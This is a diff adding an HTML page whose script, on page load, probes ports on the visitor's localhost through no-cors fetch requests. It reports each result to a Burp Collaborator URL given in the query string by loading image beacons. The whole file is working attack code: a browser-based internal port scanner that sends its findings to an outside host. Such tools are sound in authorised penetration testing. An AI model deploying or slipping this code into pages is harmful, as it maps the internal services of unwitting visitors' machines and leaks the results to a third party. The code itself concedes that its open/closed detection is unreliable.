@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Port Scan and Ping Burp Collaborator</title>
+    <script type="text/javascript">
+        // Function to get URL parameters
+        function getQueryParam(param) {
+            let urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        async function scanPort(host, port, collaboratorUrl) {
+            try {
+                let url = `http://${host}:${port}`;
+                let response = await fetch(url, { mode: 'no-cors' });
+                
+                // Since no-cors mode blocks us from accessing response content, we simulate sending response details
+                let status = response ? 'open' : 'closed'; // Determining based on fetch success (not reliable in no-cors)
+                sendPing(host, port, status, collaboratorUrl, "No response data due to no-cors");
+                return port;
+            } catch (error) {
+                console.log(`Port ${port} is closed`);
+                sendPing(host, port, "closed", collaboratorUrl, error.message);
+                return null; // Port is closed
+            }
+        }
+
+        async function scanPorts(host, ports, collaboratorUrl) {
+            let openPorts = [];
+            for (let port of ports) {
+                let result = await scanPort(host, port, collaboratorUrl);
+                if (result) {
+                    openPorts.push(result);
+                }
+            }
+            return openPorts;
+        }
+
+        function sendPing(host, port, status, collaboratorUrl, responseData) {
+            let pingUrl = `${collaboratorUrl}?host=${host}&port=${port}&status=${status}&response=${encodeURIComponent(responseData)}`;
+            let img = new Image();
+            img.src = pingUrl;
+            console.log(`Ping sent to ${pingUrl}`);
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            let host = '127.0.0.1'; // Replace with your target host
+            let ports = [80, 443, 9001, 8080, 3000, 22, 21, 378923]; // List of ports to scan
+            
+            // Retrieve the collaborator URL from the query parameters
+            let collaboratorUrl = getQueryParam('url');
+            if (!collaboratorUrl) {
+                console.error('No collaboratorUrl provided in the URL parameters');
+                return;
+            }
+
+            scanPorts(host, ports, collaboratorUrl).then(openPorts => {
+                console.log("Open ports:", openPorts);
+            });
+        });
+    </script>
+</head>
+<body>
+    <p>Scanning ports and pinging Burp Collaborator...</p>
+</body>
+</html>
